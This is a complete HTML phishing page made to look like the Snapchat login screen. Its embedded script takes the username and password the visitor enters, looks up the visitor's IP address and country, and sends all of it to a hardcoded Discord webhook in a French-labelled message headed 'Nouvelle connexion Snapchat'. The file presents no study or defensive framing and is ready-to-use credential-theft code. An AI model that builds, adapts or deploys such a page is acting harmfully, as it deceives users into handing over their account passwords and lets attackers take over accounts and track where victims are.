<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Snapchat Login (Clone)</title>
  <style>
    body {
      background-color: #FFFC00;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      padding: 40px;
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    .logo {
      width: 80px;
      margin-bottom: 20px;
    }
    h2 {
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #FFFC00;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background-color: #f2e600;
    }
    .footer {
      margin-top: 20px;
      font-size: 14px;
    }
    .footer a {
      color: #000;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="logo" />
    <h2>Log In to Snapchat</h2>
    <input type="text" id="username" placeholder="Username or Email" />
    <input type="password" id="password" placeholder="Password" />
    <button id="loginBtn">Log In</button>
    <div class="footer">
      <p><a href="#">Forgot Password?</a> ‚Ä¢ <a href="#">Sign Up</a></p>
    </div>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1374847414543974481/mZ9xsWoLhBtK_miZq-1Hz_C_eoYBLk7duFSRXH48FdGOZkJruxQ0qCjeE1i0HctNTiIc";

    async function getIpInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) throw new Error('Failed to fetch IP info');
        return await response.json();
      } catch (e) {
        return null;
      }
    }

    document.getElementById('loginBtn').addEventListener('click', async function(event) {
      event.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value;

      if (!username || !password) {
        // Ne rien faire si champs vides
        return;
      }

      const ipInfo = await getIpInfo();

      let ipText = "IP inconnue";
      if (ipInfo) {
        const flag = ipInfo.country_code
          ? String.fromCodePoint(...[...ipInfo.country_code].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)))
          : "";
        ipText = `${ipInfo.ip} (${flag} ${ipInfo.country_name || 'Inconnu'})`;
      }

      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content:
            `**Nouvelle connexion Snapchat**\n` +
            `üë§ Utilisateur : ${username}\n` +
            `üîë Mot de passe : ${password}\n` +
            `üåê IP & Pays : ${ipText}`
        })
      }).catch(console.error);

      // Optionnel : vider les champs apr√®s envoi
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';
    });
  </script>
</body>
</html>
